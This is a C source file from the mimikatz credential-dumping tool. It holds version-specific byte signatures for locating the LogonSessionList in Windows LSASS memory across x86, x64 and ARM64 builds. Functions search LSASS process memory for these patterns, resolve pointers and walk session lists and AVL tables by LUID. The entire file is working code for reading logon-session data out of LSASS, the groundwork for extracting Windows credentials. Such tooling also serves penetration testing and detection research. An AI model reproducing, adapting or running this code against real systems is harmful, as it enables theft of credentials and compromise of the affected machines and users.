/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_utils.h"

#if defined(_M_ARM64)
BYTE PTRN_WN1803_LogonSessionList[] = {0xf9, 0x03, 0x00, 0xaa, 0x58, 0xe7, 0x00, 0xa9};
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {-8, 4, -16, 4}},
};
#elif defined(_M_X64)
BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE PTRN_WN63_LogonSessionList[]	= {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE PTRN_WN6x_LogonSessionList[]	= {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN11_22H2_LogonSessionList[]	= {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList},	{0, NULL}, {21,  -4}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_2022,		{sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList},	{0, NULL}, {24,  -4}},
	{KULL_M_WIN_BUILD_11_22H2,	{sizeof(PTRN_WN11_22H2_LogonSessionList), PTRN_WN11_22H2_LogonSessionList},	{0, NULL}, {27,  -4}},
};
#elif defined(_M_IX86)
BYTE PTRN_WN51_LogonSessionList[]	= {0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84};
BYTE PTRN_WNO8_LogonSessionList[]	= {0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd};
BYTE PTRN_WN80_LogonSessionList[]	= {0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74};
BYTE PTRN_WN81_LogonSessionList[]	= {0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74};
BYTE PTRN_WN6x_LogonSessionList[]	= {0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74};
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WN51_LogonSessionList),	PTRN_WN51_LogonSessionList},	{0, NULL}, { 24,   0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -43}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -42}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN80_LogonSessionList),	PTRN_WN80_LogonSessionList},	{0, NULL}, { 18,  -4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LogonSessionList),	PTRN_WN81_LogonSessionList},	{0, NULL}, { 16,  -4}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, { 16,  -4}},
};
#endif

PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{
	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
}

BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
{
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL};
	PKULL_M_PATCH_GENERIC currentReference;
	#if defined(_M_X64)
		LONG offset;
	#endif

	if(currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
		{
			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
			if(genericOffset1)
				*genericOffset1 = currentReference->Offsets.off1;
		#if defined(_M_ARM64)
			*genericPtr = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff0); // TODO:ARM64
			pLib->isInit = (*genericPtr) ? TRUE : FALSE;
		#elif defined(_M_X64)
			aLocalMemory.address = &offset;
			if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
				*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
		#elif defined(_M_IX86)
			aLocalMemory.address = genericPtr;
			pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
		#endif

			if(genericPtr1)
			{
				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
			#if defined(_M_ARM64)
				*genericPtr1 = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff1); // TODO:ARM64
				pLib->isInit = (*genericPtr1) ? TRUE : FALSE;
			#elif defined(_M_X64)
				aLocalMemory.address = &offset;
				if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
					*genericPtr1 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
			#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr1;
				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
			#endif
			}

			if(genericPtr2)
			{
				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
			#if defined(_M_ARM64)
				*genericPtr2 = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff2); // TODO:ARM64
				pLib->isInit = (*genericPtr2) ? TRUE : FALSE;
			#elif defined(_M_X64)
				aLocalMemory.address = &offset;
				if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
					*genericPtr2 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
			#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr2;
				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
			#endif
			}
		}
	}
	return pLib->isInit;
}

PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL, pStruct;
	KULL_M_MEMORY_ADDRESS data = {&pStruct, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(aBuffer.address = LocalAlloc(LPTR, LUIDoffset + sizeof(LUID)))
	{
		if(kull_m_memory_copy(&data, pSecurityStruct, sizeof(PVOID)))
		{
			data.address = pStruct;
			data.hMemory = pSecurityStruct->hMemory;

			while(data.address != pSecurityStruct->address)
			{
				if(kull_m_memory_copy(&aBuffer, &data, LUIDoffset + sizeof(LUID)))
				{
					if(SecEqualLuid(luidToFind, (PLUID) ((PBYTE)(aBuffer.address) + LUIDoffset)))
					{
						resultat = data.address;
						break;
					}
					data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
				}
				else break;
			}
		}
		LocalFree(aBuffer.address);
	}
	return resultat;
}

PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuid(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	KULL_M_MEMORY_ADDRESS data = {&maTable, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(kull_m_memory_copy(&data, pTable, sizeof(RTL_AVL_TABLE)))
	{
		pTable->address = maTable.BalancedRoot.RightChild;
		resultat = kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(pTable, LUIDoffset, luidToFind);
	}
	return resultat;
}

PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	KULL_M_MEMORY_ADDRESS data = {&maTable, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(kull_m_memory_copy(&data, pTable, sizeof(RTL_AVL_TABLE)))
	{
		if(pTable->address = maTable.OrderedPointer)
		{
			if(data.address = LocalAlloc(LPTR, LUIDoffset + sizeof(LUID)))
			{
				if(kull_m_memory_copy(&data, pTable, LUIDoffset + sizeof(LUID)))
				{
					if(SecEqualLuid(luidToFind, (PLUID) ((PBYTE) (data.address) + LUIDoffset)))
						resultat = maTable.OrderedPointer;
				}
				LocalFree(data.address);
			}
		}
		if(!resultat && (pTable->address = maTable.BalancedRoot.LeftChild))
			resultat = kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(pTable, LUIDoffset, luidToFind);
		if(!resultat && (pTable->address = maTable.BalancedRoot.RightChild))
			resultat = kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(pTable, LUIDoffset, luidToFind);
	}
	return resultat;
}